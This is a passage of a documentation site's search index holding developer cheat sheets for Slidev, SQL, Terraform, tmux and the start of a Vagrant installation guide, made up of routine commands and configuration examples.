}\"\n  :leave=\"{ x: 1000 }\"&gt;\n  Complex animation\n&lt;/div&gt;\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#available-animation-properties","title":"Available animation properties","text":"<pre><code>&lt;div\n  v-motion\n  :initial=\"{\n    x: 0,           # X position\n    y: 0,           # Y position\n    scale: 1,       # Scale\n    rotate: 0,      # Rotation (degrees)\n    opacity: 1      # Opacity\n  }\"\n  :enter=\"{\n    x: 100,\n    transition: {\n      duration: 500,  # Duration in ms\n      delay: 100,     # Delay in ms\n      ease: 'easeOut' # Easing type\n    }\n  }\"&gt;\n  Animated element\n&lt;/div&gt;\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#slide-transitions","title":"Slide transitions","text":""},{"location":"cheat-sheet/slidev/slidev/#global-transitions","title":"Global transitions","text":"<pre><code>---\ntransition: slide-left    # fade, slide-left, slide-right, slide-up, slide-down\n---\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#per-slide-transitions","title":"Per-slide transitions","text":"<pre><code>---\ntransition: fade\n---\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#custom-transitions-forwardbackward","title":"Custom transitions (forward/backward)","text":"<pre><code>---\ntransition: slide-left|slide-right  # slide-left forward, slide-right backward\n---\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#built-in-components","title":"Built-in components","text":""},{"location":"cheat-sheet/slidev/slidev/#arrow","title":"Arrow","text":"<pre><code>&lt;Arrow x1=\"10\" y1=\"20\" x2=\"100\" y2=\"200\" /&gt;\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#autofittext-adaptive-text","title":"AutoFitText (adaptive text)","text":"<pre><code>&lt;AutoFitText :max=\"200\" :min=\"100\" modelValue=\"Large text\" /&gt;\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#lightordark-lightdark-theme-conditional","title":"LightOrDark (light/dark theme conditional)","text":"<pre><code>&lt;LightOrDark&gt;\n  &lt;template #dark&gt;Dark mode content&lt;/template&gt;\n  &lt;template #light&gt;Light mode content&lt;/template&gt;\n&lt;/LightOrDark&gt;\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#link","title":"Link","text":"<pre><code>&lt;Link to=\"5\"&gt;Go to slide 5&lt;/Link&gt;\n&lt;Link to=\"5\" title=\"Link title\" /&gt;\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#renderwhen-conditional-rendering","title":"RenderWhen (conditional rendering)","text":"<pre><code>&lt;RenderWhen context=\"main\"&gt;\n  Displayed only in main presentation\n&lt;/RenderWhen&gt;\n\n&lt;RenderWhen context=\"presenter\"&gt;\n  Displayed only in presenter mode\n&lt;/RenderWhen&gt;\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#slidecurrentno-slide-number","title":"SlideCurrentNo (slide number)","text":"<pre><code>Slide &lt;SlideCurrentNo /&gt; / &lt;SlidesTotal /&gt;\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#toc-toclist-table-of-contents","title":"Toc / TocList (table of contents)","text":"<pre><code>&lt;Toc /&gt;\n\n# Or with options\n&lt;TocList maxDepth=\"2\" minDepth=\"1\" /&gt;\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#transform","title":"Transform","text":"<pre><code>&lt;Transform :scale=\"0.5\"&gt;\n  &lt;YourElements /&gt;\n&lt;/Transform&gt;\n\n&lt;Transform :rotate=\"45\" origin=\"top left\"&gt;\n  Rotated element\n&lt;/Transform&gt;\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#tweet-embed-tweet","title":"Tweet (embed tweet)","text":"<pre><code>&lt;Tweet id=\"1234567890\" /&gt;\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#vueslidecore-custom-vue-slide","title":"VueSlideCore (custom Vue slide)","text":"<pre><code>&lt;VueSlideCore :page=\"5\" /&gt;\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#youtube-youtube-video","title":"Youtube (YouTube video)","text":"<pre><code>&lt;Youtube id=\"dQw4w9WgXcQ\" width=\"100%\" height=\"400px\" /&gt;\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#presenter-notes","title":"Presenter notes","text":"<pre><code>---\nlayout: center\n---\n\n# My slide\n\nVisible content\n\n&lt;!--\nThis is a presenter note\nVisible only in presenter mode\n--&gt;\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#mathematical-formulas-latex","title":"Mathematical formulas (LaTeX)","text":""},{"location":"cheat-sheet/slidev/slidev/#inline","title":"Inline","text":"<pre><code>Inline formula: $E = mc^2$\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#block","title":"Block","text":"<pre><code>$$\n\\frac{d}{dx}\\left( \\int_{0}^{x} f(u)\\,du\\right)=f(x)\n$$\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#diagrams","title":"Diagrams","text":""},{"location":"cheat-sheet/slidev/slidev/#mermaid","title":"Mermaid","text":"<pre><code>\u200b```mermaid\ngraph TD\n  A[Start] --&gt; B[Process]\n  B --&gt; C[End]\n\u200b```\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#plantuml","title":"PlantUML","text":"<pre><code>\u200b```plantuml\n@startuml\nAlice -&gt; Bob: Hello\nBob -&gt; Alice: Hi!\n@enduml\n\u200b```\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#style-and-css","title":"Style and CSS","text":""},{"location":"cheat-sheet/slidev/slidev/#global-css-classes","title":"Global CSS classes","text":"<pre><code>---\nclass: text-center text-2xl\n---\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#slide-scoped-css","title":"Slide-scoped CSS","text":"<pre><code>---\nlayout: center\n---\n\n# My slide\n\n&lt;style&gt;\nh1 {\n  color: red;\n}\n&lt;/style&gt;\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#unocss-classes","title":"UnoCSS classes","text":"<pre><code>&lt;div class=\"text-3xl text-blue-500 font-bold\"&gt;\n  Text styled with UnoCSS\n&lt;/div&gt;\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#mdc-syntax-markdown-components","title":"MDC syntax (Markdown Components)","text":""},{"location":"cheat-sheet/slidev/slidev/#add-classes-and-attributes","title":"Add classes and attributes","text":"<pre><code># Title {.text-red-500}\n\n[Link]{.text-blue-500 target=\"_blank\"}\n\n![Image](/img.jpg){.rounded-lg .shadow-xl}\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#components-with-props","title":"Components with props","text":"<pre><code>::component-name{prop1=\"value\" prop2=\"value\"}\nContent\n::\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#icons","title":"Icons","text":""},{"location":"cheat-sheet/slidev/slidev/#with-unocss","title":"With UnoCSS","text":"<pre><code>&lt;div class=\"i-carbon-logo-github\" /&gt;\n&lt;div class=\"i-mdi-account text-3xl text-red-500\" /&gt;\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#backgrounds","title":"Backgrounds","text":""},{"location":"cheat-sheet/slidev/slidev/#background-image","title":"Background image","text":"<pre><code>---\nbackground: /path/to/image.jpg\n---\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#background-color","title":"Background color","text":"<pre><code>---\nbackground: '#1e1e1e'\n---\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#gradient","title":"Gradient","text":"<pre><code>---\nbackground: linear-gradient(to right, #ff0000, #0000ff)\n---\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#video-background","title":"Video background","text":"<pre><code>---\nbackground: /video.mp4\n---\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#import-external-slides","title":"Import external slides","text":""},{"location":"cheat-sheet/slidev/slidev/#import-a-file","title":"Import a file","text":"<pre><code>---\nsrc: ./external-slides.md\n---\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#import-a-range-of-slides","title":"Import a range of slides","text":"<pre><code>---\nsrc: ./external-slides.md\npages: 1-5\n---\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#presenter-mode","title":"Presenter mode","text":"<ul> <li>Press <code>?</code> to see all keyboard shortcuts</li> <li>Presenter notes visible only in presentation mode</li> <li>Next slide preview</li> <li>Timer and clock</li> </ul>"},{"location":"cheat-sheet/slidev/slidev/#essential-keyboard-shortcuts","title":"Essential keyboard shortcuts","text":"Key Action <code>Space</code> / <code>\u2192</code> Next slide <code>\u2190</code> Previous slide <code>\u2191</code> Previous slide (no animations) <code>\u2193</code> Next slide (no animations) <code>Home</code> First slide <code>End</code> Last slide <code>f</code> Fullscreen <code>o</code> Overview <code>d</code> Dark mode <code>g</code> Show/hide camera <code>r</code> Recording <code>e</code> Drawing mode <code>c</code> Presenter notes <code>?</code> Show all shortcuts"},{"location":"cheat-sheet/slidev/slidev/#export","title":"Export","text":""},{"location":"cheat-sheet/slidev/slidev/#pdf","title":"PDF","text":"<pre><code>slidev export\n\n# With options\nslidev export --format pdf --output slides.pdf\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#png","title":"PNG","text":"<pre><code>slidev export --format png\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#pptx","title":"PPTX","text":"<pre><code>slidev export --format pptx\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#export-options","title":"Export options","text":"<pre><code>slidev export --dark           # Dark mode\nslidev export --with-clicks    # Include animations\nslidev export --timeout 30000  # Render timeout\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#build-for-production","title":"Build for production","text":"<pre><code>slidev build\n\n# With base path\nslidev build --base /slides/\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#hosting","title":"Hosting","text":"<p>Built slides can be hosted on any static server: - GitHub Pages - Netlify - Vercel - Custom server</p>"},{"location":"cheat-sheet/slidev/slidev/#advanced-configuration","title":"Advanced configuration","text":""},{"location":"cheat-sheet/slidev/slidev/#viteconfigts-file","title":"vite.config.ts file","text":"<pre><code>import { defineConfig } from 'vite'\n\nexport default defineConfig({\n  slidev: {\n    // Slidev options\n  }\n})\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#custom-themes","title":"Custom themes","text":"<pre><code>---\ntheme: ./custom-theme\n---\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#addons","title":"Addons","text":"<p>Install addons via npm and configure them in frontmatter: <pre><code>---\naddons:\n  - slidev-addon-example\n---\n</code></pre></p>"},{"location":"cheat-sheet/slidev/slidev/#tips","title":"Tips","text":""},{"location":"cheat-sheet/slidev/slidev/#disable-animations","title":"Disable animations","text":"<pre><code>---\nclicks: 0  # No clicks on this slide\n---\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#aspect-ratio","title":"Aspect ratio","text":"<pre><code>---\naspectRatio: '16/9'  # or '4/3'\n---\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#global-line-numbering","title":"Global line numbering","text":"<pre><code>---\nlineNumbers: true\n---\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#custom-favicon","title":"Custom favicon","text":"<p>Place <code>public/favicon.ico</code> in the project</p>"},{"location":"cheat-sheet/slidev/slidev/#custom-fonts","title":"Custom fonts","text":"<pre><code>---\nfonts:\n  sans: 'Robot'\n  serif: 'Robot Slab'\n  mono: 'Fira Code'\n---\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#resources","title":"Resources","text":"<ul> <li>Official documentation: https://sli.dev</li> <li>GitHub: https://github.com/slidevjs/slidev</li> <li>Themes: https://sli.dev/themes/gallery.html</li> <li>Addons: https://sli.dev/addons/use.html</li> </ul>"},{"location":"cheat-sheet/sql/sql/","title":"sql","text":"<pre><code>select * from table where u &gt; 1;\n</code></pre>"},{"location":"cheat-sheet/sql/sql/#mcd-designer","title":"MCD Designer:","text":"<p>http://ondras.zarovi.cz/sql/demo/</p>"},{"location":"cheat-sheet/sql/sql/#sqlzoo-if-youre-stuck","title":"sqlZoo, if you're stuck !!!:","text":"<p>http://sqlzoo.net/wiki/SQL_Tutorial</p>"},{"location":"cheat-sheet/terraform/terraform/","title":"\ufffd\ufe0f Terraform Cheat Sheet","text":"<p>Filename suggestion: <code>TERRAFORM_CHEATSHEET.md</code> Quick reference for HashiCorp Terraform (HCL &amp; CLI). Covers commands, configuration patterns, state, modules, and best practices.</p>"},{"location":"cheat-sheet/terraform/terraform/#cli-basics","title":"\u2699\ufe0f CLI Basics","text":"<pre><code>terraform init        # Initialize working directory (providers, backend)\nterraform validate    # Validate configuration\nterraform fmt         # Reformat files to canonical HCL style\nterraform plan        # Show execution plan\nterraform apply       # Apply changes (use -auto-approve to skip prompt)\nterraform destroy     # Destroy managed infrastructure\nterraform fmt -recursive\n</code></pre> <p>Common flags: - <code>-var 'name=value'</code> pass variable on CLI - <code>-var-file=\"filename.tfvars\"</code> pass variables file - <code>-target=resource</code> focus plan/apply to specific resource (use rarely) - <code>-out=tfplan</code> save plan to file - <code>-lock=false</code> disable state locking (careful)</p>"},{"location":"cheat-sheet/terraform/terraform/#file-layout-recommended","title":"\ufffd\ufe0f File layout (recommended)","text":"<pre><code>.\n\u251c\u2500\u2500 main.tf          # resources &amp; provider configuration\n\u251c\u2500\u2500 variables.tf     # variable declarations\n\u251c\u2500\u2500 outputs.tf       # outputs\n\u251c\u2500\u2500 providers.tf     # provider blocks (optional split)\n\u251c\u2500\u2500 versions.tf      # required Terraform and provider versions\n\u251c\u2500\u2500 terraform.tfvars # default variable values (gitignored for secrets)\n\u2514\u2500\u2500 modules/         # local modules\n</code></pre>"},{"location":"cheat-sheet/terraform/terraform/#hcl-basics","title":"\ufffd HCL Basics","text":""},{"location":"cheat-sheet/terraform/terraform/#providers","title":"Providers","text":"<pre><code>terraform {\n  required_version = \"&gt;= 1.0.0\"\n  required_providers {\n    aws = {\n      source  = \"hashicorp/aws\"\n      version = \"~&gt; 4.0\"\n    }\n  }\n}\n\nprovider \"aws\" {\n  region = var.region\n}\n</code></pre>"},{"location":"cheat-sheet/terraform/terraform/#resources","title":"Resources","text":"<pre><code>resource \"aws_instance\" \"web\" {\n  ami           = var.ami\n  instance_type = \"t3.micro\"\n\n  tags = {\n    Name = \"web-${var.env}\"\n  }\n}\n</code></pre>"},{"location":"cheat-sheet/terraform/terraform/#data-sources","title":"Data sources","text":"<pre><code>data \"aws_ami\" \"ubuntu\" {\n  most_recent = true\n  owners      = [\"099720109477\"] # Canonical\n  filter {\n    name   = \"name\"\n    values = [\"ubuntu/images/*ubuntu-focal-20.04-amd64-server-*\"]\n  }\n}\n</code></pre>"},{"location":"cheat-sheet/terraform/terraform/#variables","title":"Variables","text":"<pre><code>variable \"region\" {\n  description = \"AWS region\"\n  type        = string\n  default     = \"eu-west-1\"\n}\n\nvariable \"allowed_ips\" {\n  type = list(string)\n}\n</code></pre> <p>Pass via <code>terraform.tfvars</code> or CLI: <pre><code>region = \"eu-west-1\"\n</code></pre></p>"},{"location":"cheat-sheet/terraform/terraform/#outputs","title":"Outputs","text":"<pre><code>output \"instance_ip\" {\n  description = \"Public IP of web\"\n  value       = aws_instance.web.public_ip\n  sensitive   = false\n}\n</code></pre>"},{"location":"cheat-sheet/terraform/terraform/#expressions-interpolation-functions","title":"\ufffd Expressions, Interpolation &amp; Functions","text":"<ul> <li>String interpolation: <code>${var.name}</code> (HCL2 supports direct expressions: <code>var.name</code>)</li> <li>Conditionals: <code>count = var.create ? 1 : 0</code></li> <li>For expressions:   <pre><code>tags = { for k,v in local.base_tags : k =&gt; v }\nsubnet_ids = [for s in aws_subnet.all : s.id]\n</code></pre></li> <li>Common functions: <code>lookup()</code>, <code>concat()</code>, <code>join()</code>, <code>split()</code>, <code>element()</code>, <code>length()</code>, <code>replace()</code>, <code>file()</code>, <code>filebase64()</code>, <code>terraform.workspace</code></li> </ul>"},{"location":"cheat-sheet/terraform/terraform/#count-for_each-dynamic-blocks","title":"\ufffd Count, For_each, Dynamic Blocks","text":""},{"location":"cheat-sheet/terraform/terraform/#count","title":"<code>count</code>","text":"<pre><code>resource \"aws_instance\" \"app\" {\n  count = var.instance_count\n  ami = var.ami\n  instance_type = \"t3.micro\"\n  tags = { Name = \"app-${count.index}\" }\n}\n</code></pre>"},{"location":"cheat-sheet/terraform/terraform/#for_each","title":"<code>for_each</code>","text":"<pre><code>resource \"aws_s3_bucket\" \"b\" {\n  for_each = toset(var.bucket_names)\n  bucket = each.value\n}\n</code></pre>"},{"location":"cheat-sheet/terraform/terraform/#dynamic-blocks","title":"Dynamic blocks","text":"<pre><code>resource \"aws_security_group\" \"sg\" {\n  # ...\n  dynamic \"ingress\" {\n    for_each = var.ingress_rules\n    content {\n      from_port   = ingress.value.from\n      to_port     = ingress.value.to\n      protocol    = ingress.value.protocol\n      cidr_blocks = ingress.value.cidr_blocks\n    }\n  }\n}\n</code></pre>"},{"location":"cheat-sheet/terraform/terraform/#state-backends","title":"\ufffd State &amp; Backends","text":""},{"location":"cheat-sheet/terraform/terraform/#local-state-default","title":"Local state (default)","text":"<p>State stored in <code>terraform.tfstate</code> (don't commit to VCS).</p>"},{"location":"cheat-sheet/terraform/terraform/#remote-backends-recommended-for-teams","title":"Remote backends (recommended for teams)","text":"<p>Examples: S3 (AWS) with DynamoDB lock, Terraform Cloud, Azure Blob, GCS.</p> <p>Example S3 backend with locking: <pre><code>terraform {\n  backend \"s3\" {\n    bucket         = \"my-terraform-state\"\n    key            = \"prod/terraform.tfstate\"\n    region         = \"eu-west-1\"\n    dynamodb_table = \"terraform-locks\"\n    encrypt        = true\n  }\n}\n</code></pre></p> <p>Commands for remote state: <pre><code>terraform init            # configure backend\nterraform state list      # list resources in state\nterraform state show aws_instance.web\nterraform state pull      # fetch remote state\nterraform state push      # push state (use carefully)\nterraform refresh         # update state with real-world resources\n</code></pre></p>"},{"location":"cheat-sheet/terraform/terraform/#workspaces","title":"\ufffd Workspaces","text":"<ul> <li><code>terraform workspace list</code></li> <li><code>terraform workspace new dev</code></li> <li><code>terraform workspace select prod</code></li> <li><code>terraform.workspace</code> gives current workspace in expressions</li> </ul> <p>Workspaces are namespace for state \u2014 use with caution; not a substitute for separate environments when resources differ.</p>"},{"location":"cheat-sheet/terraform/terraform/#modules","title":"\ufffd Modules","text":"<p>Create reusable modules under <code>modules/</code> or use registry modules.</p> <p>Call a module: <pre><code>module \"vpc\" {\n  source = \"terraform-aws-modules/vpc/aws\"\n  version = \"&gt;= 3.0\"\n  name = \"my-vpc\"\n  cidr = \"10.0.0.0/16\"\n  azs  = [\"eu-west-1a\",\"eu-west-1b\"]\n}\n</code></pre></p> <p>Local module: <pre><code>module \"app\" {\n  source = \"./modules/app\"\n  env    = var.env\n}\n</code></pre></p> <p>Best practices: - Keep modules small and focused. - Version registry modules via <code>version</code>. - Use inputs/outputs; avoid hard-coded ARNs.</p>"},{"location":"cheat-sheet/terraform/terraform/#provisioners-last-resort","title":"\ufffd Provisioners (last resort)","text":"<p>Use <code>remote-exec</code> or <code>local-exec</code> only when necessary (immutable infra preferred).</p> <p>Example: <pre><code>resource \"aws_instance\" \"app\" {\n  # ...\n  provisioner \"remote-exec\" {\n    inline = [\n      \"sudo apt update\",\n      \"sudo apt install -y nginx\"\n    ]\n    connection {\n      type        = \"ssh\"\n      user        = \"ubuntu\"\n      private_key = file(var.private_key_path)\n      host        = self.public_ip\n    }\n  }\n}\n</code></pre></p>"},{"location":"cheat-sheet/terraform/terraform/#importing-existing-resources","title":"\ufffd Importing existing resources","text":"<p><pre><code>terraform import aws_instance.web i-0123456789abcdef0\n</code></pre> Then add the corresponding resource block to config and run <code>terraform plan</code> to align.</p>"},{"location":"cheat-sheet/terraform/terraform/#lifecycle-meta-arguments","title":"\u26a0\ufe0f Lifecycle meta-arguments","text":"<pre><code>resource \"aws_instance\" \"db\" {\n  # ...\n  lifecycle {\n    prevent_destroy = true        # protect resource from destroy\n    create_before_destroy = true  # replace without downtime\n    ignore_changes = [ \"tags\" ]   # ignore specific attribute changes\n  }\n}\n</code></pre>"},{"location":"cheat-sheet/terraform/terraform/#locks-concurrency","title":"\ufffd Locks &amp; Concurrency","text":"<ul> <li>Use backend with locking (DynamoDB for S3, Terraform Cloud, etc.).</li> <li><code>terraform force-unlock LOCK_ID</code> to recover from stale locks.</li> </ul>"},{"location":"cheat-sheet/terraform/terraform/#debugging-logs","title":"\ufffd Debugging &amp; Logs","text":"<ul> <li><code>TF_LOG=TRACE terraform apply</code> (very verbose)</li> <li><code>TF_LOG=DEBUG</code> or <code>INFO</code> for less noise</li> <li><code>TF_CLI_ARGS_plan=\"-out=tfplan\"</code> to persist plans</li> </ul>"},{"location":"cheat-sheet/terraform/terraform/#secrets-sensitive-data","title":"\ufffd Secrets &amp; Sensitive Data","text":"<ul> <li>Mark outputs/variables as <code>sensitive = true</code>.</li> <li>Avoid storing secrets in <code>terraform.tfstate</code> (state can contain secrets).</li> <li>Use secret stores: AWS Secrets Manager, Vault (HashiCorp Vault provider), SSM Parameter Store.</li> <li>Use environment variables for provider creds (<code>AWS_PROFILE</code>, <code>GOOGLE_APPLICATION_CREDENTIALS</code>, etc.).</li> </ul>"},{"location":"cheat-sheet/terraform/terraform/#best-practices","title":"\u2705 Best practices","text":"<ul> <li>Keep <code>terraform.tfstate</code> in secure remote backend (not in Git).</li> <li>Use <code>terraform fmt</code> and <code>validate</code> in CI.</li> <li>Pin provider versions in <code>required_providers</code>.</li> <li>Break infra into small modules.</li> <li>Prefer immutable infra patterns (replace rather than mutate).</li> <li>Use <code>create_before_destroy</code> for critical resources needing replacement.</li> <li>Review plans (<code>terraform plan</code>) before <code>apply</code> in CI/CD.</li> </ul>"},{"location":"cheat-sheet/terraform/terraform/#cicd-tips","title":"\ufffd CI/CD Tips","text":"<ul> <li>In CI, run: <pre><code>terraform init -input=false\nterraform plan -input=false -out=tfplan\nterraform show -no-color tfplan &gt; tfplan.txt\n# human review or automated checks\nterraform apply -input=false tfplan\n</code></pre></li> <li>Consider Terraform Cloud or Atlantis for PR-driven workflows.</li> </ul>"},{"location":"cheat-sheet/terraform/terraform/#useful-commands-summary","title":"\ufffd Useful Commands Summary","text":"<pre><code>terraform init\nterraform fmt -recursive\nterraform validate\nterraform plan -out=tfplan\nterraform apply tfplan\nterraform apply -auto-approve\nterraform destroy\nterraform import &lt;type.name&gt; &lt;id&gt;\nterraform state list\nterraform state show &lt;address&gt;\nterraform workspace list\nterraform workspace new &lt;name&gt;\nterraform providers\n</code></pre>"},{"location":"cheat-sheet/terraform/terraform/#further-resources","title":"\ufffd Further resources","text":"<ul> <li>Official docs: https://developer.hashicorp.com/terraform</li> <li>Terraform Registry: https://registry.terraform.io</li> <li>Style guides &amp; community modules on the registry</li> </ul> <p>End of Terraform cheat sheet.</p>"},{"location":"cheat-sheet/tmux/tmux/","title":"tmux","text":""},{"location":"cheat-sheet/tmux/tmux/#tmux-shortcuts-cheatsheet","title":"tmux shortcuts &amp; cheatsheet","text":"<p>start new:</p> <pre><code>tmux\n</code></pre> <p>start new with session name:</p> <pre><code>tmux new -s myname\n</code></pre> <p>attach:</p> <pre><code>tmux a  #  (or at, or attach)\n</code></pre> <p>attach to named:</p> <pre><code>tmux a -t myname\n</code></pre> <p>list sessions:</p> <pre><code>tmux ls\n</code></pre> <p>kill session:</p> <pre><code>tmux kill-session -t myname\n</code></pre> <p>Kill all the tmux sessions:</p> <pre><code>tmux ls | grep : | cut -d. -f1 | awk '{print substr($1, 0, length($1)-1)}' | xargs kill\n</code></pre> <p>In tmux, hit the prefix <code>ctrl+b</code> (my modified prefix is ctrl+a) and then:</p>"},{"location":"cheat-sheet/tmux/tmux/#list-all-shortcuts","title":"List all shortcuts","text":"<p>to see all the shortcuts keys in tmux simply use the <code>bind-key ?</code> in my case that would be <code>CTRL-B ?</code></p>"},{"location":"cheat-sheet/tmux/tmux/#sessions","title":"Sessions","text":"<pre><code>:new&lt;CR&gt;  new session\ns  list sessions\n$  name session\n</code></pre>"},{"location":"cheat-sheet/tmux/tmux/#windows-tabs","title":"Windows (tabs)","text":"<pre><code>c  create window\nw  list windows\nn  next window\np  previous window\nf  find window\n,  name window\n&amp;  kill window\n</code></pre>"},{"location":"cheat-sheet/tmux/tmux/#panes-splits","title":"Panes (splits)","text":"<pre><code>%  vertical split\n\"  horizontal split\n\no  swap panes\nq  show pane numbers\nx  kill pane\n+  break pane into window (e.g. to select text by mouse to copy)\n-  restore pane from window\n\u237d  space - toggle between layouts\n&lt;prefix&gt; q (Show pane numbers, when the numbers show up type the key to goto that pane)\n&lt;prefix&gt; { (Move the current pane left)\n&lt;prefix&gt; } (Move the current pane right)\n&lt;prefix&gt; z toggle pane zoom\n</code></pre>"},{"location":"cheat-sheet/tmux/tmux/#sync-panes","title":"Sync Panes","text":"<p>You can do this by switching to the appropriate window, typing your Tmux prefix (commonly Ctrl-B or Ctrl-A) and then a colon to bring up a Tmux command line, and typing:</p> <pre><code>:setw synchronize-panes\n</code></pre> <p>You can optionally add on or off to specify which state you want; otherwise the option is simply toggled. This option is specific to one window, so it won\u2019t change the way your other sessions or windows operate. When you\u2019re done, toggle it off again by repeating the command. tip source</p>"},{"location":"cheat-sheet/tmux/tmux/#resizing-panes","title":"Resizing Panes","text":"<p>You can also resize panes if you don\u2019t like the layout defaults. I personally rarely need to do this, though it\u2019s handy to know how. Here is the basic syntax to resize panes:</p> <pre><code>PREFIX : resize-pane -D (Resizes the current pane down)\nPREFIX : resize-pane -U (Resizes the current pane upward)\nPREFIX : resize-pane -L (Resizes the current pane left)\nPREFIX : resize-pane -R (Resizes the current pane right)\nPREFIX : resize-pane -D 20 (Resizes the current pane down by 20 cells)\nPREFIX : resize-pane -U 20 (Resizes the current pane upward by 20 cells)\nPREFIX : resize-pane -L 20 (Resizes the current pane left by 20 cells)\nPREFIX : resize-pane -R 20 (Resizes the current pane right by 20 cells)\nPREFIX : resize-pane -t 2 20 (Resizes the pane with the id of 2 down by 20 cells)\nPREFIX : resize-pane -t -L 20 (Resizes the pane with the id of 2 left by 20 cells)\n</code></pre>"},{"location":"cheat-sheet/tmux/tmux/#copy-mode","title":"Copy mode:","text":"<p>Pressing PREFIX [ places us in Copy mode. We can then use our movement keys to move our cursor around the screen. By default, the arrow keys work. we set our configuration file to use Vim keys for moving between windows and resizing panes so we wouldn\u2019t have to take our hands off the home row. tmux has a vi mode for working with the buffer as well. To enable it, add this line to .tmux.conf:</p> <pre><code>setw -g mode-keys vi\n</code></pre> <p>With this option set, we can use h, j, k, and l to move around our buffer.</p> <p>To get out of Copy mode, we just press the ENTER key. Moving around one character at a time isn\u2019t very efficient. Since we enabled vi mode, we can also use some other visible shortcuts to move around the buffer.</p> <p>For example, we can use \"w\" to jump to the next word and \"b\" to jump back one word. And we can use \"f\", followed by any character, to jump to that character on the same line, and \"F\" to jump backwards on the line.</p> <pre><code>   Function                vi             emacs\n   Back to indentation     ^              M-m\n   Clear selection         Escape         C-g\n   Copy selection          Enter          M-w\n   Cursor down             j              Down\n   Cursor left             h              Left\n   Cursor right            l              Right\n   Cursor to bottom line   L\n   Cursor to middle line   M              M-r\n   Cursor to top line      H              M-R\n   Cursor up               k              Up\n   Delete entire line      d              C-u\n   Delete to end of line   D              C-k\n   End of line             $              C-e\n   Goto line               :              g\n   Half page down          C-d            M-Down\n   Half page up            C-u            M-Up\n   Next page               C-f            Page down\n   Next word               w              M-f\n   Paste buffer            p              C-y\n   Previous page           C-b            Page up\n   Previous word           b              M-b\n   Quit mode               q              Escape\n   Scroll down             C-Down or J    C-Down\n   Scroll up               C-Up or K      C-Up\n   Search again            n              n\n   Search backward         ?              C-r\n   Search forward          /              C-s\n   Start of line           0              C-a\n   Start selection         Space          C-Space\n   Transpose chars                        C-t\n</code></pre>"},{"location":"cheat-sheet/tmux/tmux/#misc","title":"Misc","text":"<pre><code>d  detach\nt  big clock\n?  list shortcuts\n:  prompt\n</code></pre>"},{"location":"cheat-sheet/tmux/tmux/#configurations-options","title":"Configurations Options:","text":"<pre><code># Mouse support - set to on if you want to use the mouse\n* setw -g mode-mouse off\n* set -g mouse-select-pane off\n* set -g mouse-resize-pane off\n* set -g mouse-select-window off\n\n# Set the default terminal mode to 256color mode\nset -g default-terminal \"screen-256color\"\n\n# enable activity alerts\nsetw -g monitor-activity on\nset -g visual-activity on\n\n# Center the window list\nset -g status-justify centre\n\n# Maximize and restore a pane\nunbind Up bind Up new-window -d -n tmp \\; swap-pane -s tmp.1 \\; select-window -t tmp\nunbind Down\nbind Down last-window \\; swap-pane -s tmp.1 \\; kill-window -t tmp\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/","title":"Vagrant - Complete Guide","text":"<p>Vagrant is a development virtual machine management tool that allows you to create and configure reproducible environments.</p>"},{"location":"cheat-sheet/vagrant/vagrant/#installation","title":"Installation","text":""},{"location":"cheat-sheet/vagrant/vagrant/#macos","title":"macOS","text":"<pre><code># Via Homebrew Cask\nbrew install --cask vagrant\n\n# Install VirtualBox (default provider)\nbrew install --cask virtualbox\n\n# Check installation\nvagrant --version\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#linux-ubuntudebian","title":"Linux (Ubuntu/Debian)","text":"<pre><code># Download from official website\nwget https://releases.hashicorp.com/vagrant/2.4.0/vagrant_2.4.0-1_amd64.deb\nsudo dpkg -i vagrant_2.4.0-1_amd64.deb\n\n# Install VirtualBox\nsudo apt update\nsudo apt install virtualbox\n\n# Check\nvagrant --version\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#windows","title":"Windows","text":"<pre><code># Via Chocolatey\nchoco install vagrant\n\n# Or download the installer from\n# https://www.vagrantup.com/downloads\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#essential-commands","title":"Essential Commands","text":""},{"location":"cheat-sheet/vagrant/vagrant/#initialization-and-startup","title":"Initialization and 